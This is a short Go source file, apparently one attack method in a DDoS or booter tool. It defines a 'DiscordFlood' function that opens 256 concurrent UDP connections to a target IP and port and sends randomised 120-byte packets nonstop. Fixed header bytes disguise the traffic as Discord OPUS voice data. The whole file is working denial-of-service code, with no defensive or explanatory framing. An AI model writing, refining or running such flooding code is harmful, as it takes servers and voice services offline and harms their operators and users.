package methods

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"
)

// DiscordFlood - Mimics Discord voice traffic (OPUS packets)
func DiscordFlood(ctx context.Context, IP, PORT string, SECONDS int) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] Discord (Voice-Like) Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	addr := net.JoinHostPort(IP, PORT)

	for i := 0; i < 256; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			defer conn.Close()
			
			// Discord voice packets are typically small (OPUS)
			payload := make([]byte, 120) 
			
			for {
				select {
				case <-ctx.Done():
					return
				default:
					// Randomize payload to mimic encrypted voice data
					rand.Read(payload)
					
					// Add a "header" byte often seen in some UDP protocols
					payload[0] = 0x80 
					payload[1] = 0x78
					
					conn.Write(payload)
				}
			}
		}()
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Printf("[%s] Discord Attack finished.\n", time.Now().Format("15:04:05"))
}
